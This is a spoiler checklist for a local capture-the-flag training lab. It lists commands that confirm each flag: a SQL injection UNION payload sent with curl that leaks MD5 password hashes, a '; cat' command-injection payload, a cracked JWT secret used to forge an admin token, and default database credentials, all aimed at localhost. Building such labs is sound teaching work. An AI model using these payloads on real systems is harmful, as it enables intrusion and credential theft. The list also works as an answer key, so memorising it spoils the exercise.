# Live-stack check list (spoilers)

Run these on a Linux host (Kali) with the lab running to confirm every flag
comes out of the real containers. They were written on Windows, where Docker
was not available.

1. `python3 labctl.py start` brings the portal up on <http://127.0.0.1:8080>.
2. `nmap -sV 127.0.0.1` shows 8080 (web) and 5432 (Postgres backup). The grading
   service must **not** appear (it is internal only).
3. `psql "postgresql://mfano:postgres@127.0.0.1:5432/results_backup" -c "SELECT * FROM backup_notes;"`
   gives the P2-01 flag.
4. `python3 labctl.py shell`, then inside the container `cat /srv/mfano/server.flag`
   and `grep -r MFANO /srv/mfano` work (P1-03, P4-01).
5. The P4-01 command injection uses a `; cat ...` payload. It only works on the
   Linux container, so test it there.
6. `pipx install pip-audit && python3 labctl.py audit` prints the P5-03 flag. If
   it can't resolve, run `pip-audit` inside the container.
7. Phase 5b crypto, all against the running portal:
   - P5B-01: `curl "http://127.0.0.1:8080/student/search?q=zzz%25'%20UNION%20SELECT%20username,md5_password%20FROM%20legacy_staff--%20-"`
     (with a logged-in session) leaks the MD5; crack to `chocolate`; log in at
     `/staff/login`.
   - P5B-02: the `mfano_vault` cookie base64-decodes to the flag.
   - P5B-03: crack the `mfano_api` JWT secret (`mfano123`), forge `role=admin`,
     `curl -H "Authorization: Bearer <forged>" .../api/exam-key`.
   - P5B-04: `curl .../static/app.config.js`, then the openssl decrypt in
     `SOLUTIONS.md`.
   - P5B-05: run the byte-at-a-time script in `SOLUTIONS.md` against `/api/seal`.
8. Submit every flag in `SOLUTIONS.md` with `labctl submit` and check that
   `labctl status` reaches 29 / 29.
